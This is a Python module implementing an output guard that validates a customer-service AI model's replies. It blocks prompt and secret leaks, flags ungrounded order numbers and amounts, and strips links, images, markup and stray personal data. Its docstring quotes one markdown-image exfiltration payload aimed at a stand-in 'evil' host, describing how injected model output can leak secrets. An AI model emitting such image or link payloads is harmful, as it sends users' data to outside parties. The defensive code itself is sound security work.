"""Output guard: every model reply is validated before a customer sees it.

Blocking findings (the reply is discarded and a safe fallback is sent):
    * the system-prompt canary or long verbatim passages of the system prompt (prompt leak);
    * credentials or secrets (API keys, tokens, connection strings, private keys).

Retryable findings (one corrective regeneration, then fallback):
    * reference numbers (orders, tickets, refunds) that appear in no tool result, document or
      prior message - a hallucinated or cross-customer identifier;
    * money amounts that appear in no evidence - a hallucinated figure.

Sanitising findings (the reply is cleaned and delivered):
    * markdown images (a classic exfiltration channel: ``![x](https://evil/?q=<secret>)``) and
      links/URLs to domains outside the allow-list;
    * HTML tags and our own fence tags;
    * e-mail addresses and phone numbers that are not in the evidence;
    * citation markers pointing to documents that were not provided;
    * excessive length.
"""

from __future__ import annotations

import re
from collections.abc import Sequence
from dataclasses import dataclass
from decimal import Decimal, InvalidOperation
from urllib.parse import urlsplit

from aegis.domain.identifiers import find_references
from aegis.security.redaction import PiiKind, find_pii

_MD_IMAGE = re.compile(r"!\[[^\]]{0,200}\]\([^)]{0,2000}\)")
_MD_LINK = re.compile(r"\[([^\]]{0,200})\]\((\S{1,2000}?)\)")
_BARE_URL = re.compile(r"\b(?:https?|ftp)://[^\s<>\"')\]]{1,2000}", re.IGNORECASE)
_HTML_TAG = re.compile(r"</?[a-zA-Z][a-zA-Z0-9_-]{0,30}(?:\s[^<>]{0,500})?/?>")
_CITATION = re.compile(r"\[(\d{1,3})\]")
_MONEY = re.compile(
    r"(?:[$€£]\s?(\d{1,3}(?:,\d{3})*(?:\.\d{1,2})?|\d+(?:\.\d{1,2})?))"
    r"|(?:(\d{1,3}(?:,\d{3})*(?:\.\d{1,2})?|\d+(?:\.\d{1,2})?)\s?(?:USD|EUR|GBP|dollars?)\b)",
    re.IGNORECASE,
)
_NUMBER = re.compile(r"\d{1,3}(?:,\d{3})+(?:\.\d+)?|\d+(?:\.\d+)?")
_SENTENCE_END = re.compile(r"(?<=[.!?])\s")


@dataclass(frozen=True, slots=True)
class GuardResult:
    text: str
    violations: tuple[str, ...]
    blocked: bool
    retryable: bool
    ungrounded: tuple[str, ...] = ()


def _decimal(raw: str) -> Decimal | None:
    try:
        return Decimal(raw.replace(",", ""))
    except InvalidOperation:
        return None


_REPLY_PII_KINDS = frozenset(
    {PiiKind.EMAIL, PiiKind.PHONE, PiiKind.CARD, PiiKind.IBAN, PiiKind.SSN}
)


def _shingles(text: str, size: int = 8) -> set[str]:
    words = re.findall(r"[a-z0-9']+", text.lower())
    return {" ".join(words[i : i + size]) for i in range(max(0, len(words) - size + 1))}


class OutputGuard:
    def __init__(
        self,
        *,
        canary: str,
        system_prompt: str,
        allowed_link_domains: Sequence[str],
        max_chars: int,
    ) -> None:
        self._canary = canary.lower()
        self._prompt_shingles = _shingles(system_prompt.replace(canary, ""))
        self._allowed_domains = {d.lower().strip() for d in allowed_link_domains if d.strip()}
        self._max_chars = max_chars

    def _domain_allowed(self, url: str) -> bool:
        host = (urlsplit(url).hostname or "").lower().rstrip(".")
        return bool(host) and any(
            host == d or host.endswith("." + d) for d in self._allowed_domains
        )

    def check(
        self, text: str | None, *, evidence: Sequence[str], citation_count: int
    ) -> GuardResult:
        if not text or not text.strip():
            return GuardResult("", ("empty",), blocked=True, retryable=False)
        leak = self._leak(text)
        if leak is not None:
            return GuardResult("", (leak,), blocked=True, retryable=False)

        evidence_text = "\n".join(evidence)
        ungrounded = self._ungrounded(text, evidence_text)
        violations: list[str] = ["ungrounded_facts"] if ungrounded else []
        cleaned = self._strip_links_and_markup(text, violations)
        cleaned = self._strip_foreign_pii(cleaned, evidence_text.upper(), violations)
        cleaned = self._fix_citations(cleaned, citation_count, violations)
        cleaned = self._truncate(re.sub(r"[ \t]{2,}", " ", cleaned).strip(), violations)
        return GuardResult(
            text=cleaned,
            violations=tuple(dict.fromkeys(violations)),
            blocked=not cleaned,
            retryable=bool(ungrounded),
            ungrounded=tuple(dict.fromkeys(ungrounded)),
        )

    # --- blocking checks -------------------------------------------------------------------------
    def _leak(self, text: str) -> str | None:
        if self._canary and self._canary in text.lower():
            return "system_prompt_leak"
        if len(_shingles(text) & self._prompt_shingles) >= 2:
            return "system_prompt_leak"
        if find_pii(text, frozenset({PiiKind.SECRET})):
            return "secret_leak"
        return None

    # --- grounding -------------------------------------------------------------------------------
    @staticmethod
    def _ungrounded(text: str, evidence_text: str) -> list[str]:
        evidence_upper = evidence_text.upper()
        ungrounded = [
            value
            for kind, values in find_references(text).items()
            if kind != "sku"
            for value in values
            if value not in evidence_upper
        ]
        evidence_numbers = {
            d for raw in _NUMBER.findall(evidence_text) if (d := _decimal(raw)) is not None
        }
        for match in _MONEY.finditer(text):
            amount = _decimal(match.group(1) or match.group(2) or "")
            if amount is not None and amount not in evidence_numbers:
                ungrounded.append(match.group(0).strip())
        return ungrounded

    # --- sanitising ------------------------------------------------------------------------------
    def _strip_links_and_markup(self, text: str, violations: list[str]) -> str:
        cleaned = text
        if _MD_IMAGE.search(cleaned):
            cleaned = _MD_IMAGE.sub("", cleaned)
            violations.append("image_removed")

        def link(match: re.Match[str]) -> str:
            if self._domain_allowed(match.group(2)):
                return match.group(0)
            violations.append("link_removed")
            return match.group(1)

        def bare_url(match: re.Match[str]) -> str:
            if self._domain_allowed(match.group(0)):
                return match.group(0)
            violations.append("link_removed")
            return "[link removed]"

        cleaned = _BARE_URL.sub(bare_url, _MD_LINK.sub(link, cleaned))
        if _HTML_TAG.search(cleaned):
            cleaned = _HTML_TAG.sub("", cleaned)
            violations.append("markup_removed")
        return cleaned

    @staticmethod
    def _strip_foreign_pii(text: str, evidence_upper: str, violations: list[str]) -> str:
        """Remove contact details / payment identifiers that the evidence does not contain."""
        pieces: list[str] = []
        cursor = 0
        for match in find_pii(text, _REPLY_PII_KINDS):
            value = text[match.start : match.end]
            if match.kind in (PiiKind.EMAIL, PiiKind.PHONE) and value.upper() in evidence_upper:
                continue
            pieces += [text[cursor : match.start], f"[{match.kind.value} removed]"]
            cursor = match.end
            violations.append("pii_removed")
        return "".join([*pieces, text[cursor:]]) if pieces else text

    @staticmethod
    def _fix_citations(text: str, citation_count: int, violations: list[str]) -> str:
        def citation(match: re.Match[str]) -> str:
            if 1 <= int(match.group(1)) <= citation_count:
                return match.group(0)
            violations.append("bad_citation")
            return ""

        return _CITATION.sub(citation, text)

    def _truncate(self, text: str, violations: list[str]) -> str:
        if len(text) <= self._max_chars:
            return text
        cut = text[: self._max_chars]
        boundary = max((m.start() for m in _SENTENCE_END.finditer(cut)), default=-1)
        violations.append("truncated")
        return (cut[: boundary + 1] if boundary > self._max_chars // 2 else cut).rstrip() + " ..."


def cited_indices(text: str, citation_count: int) -> list[int]:
    return sorted({int(m) for m in _CITATION.findall(text) if 1 <= int(m) <= citation_count})
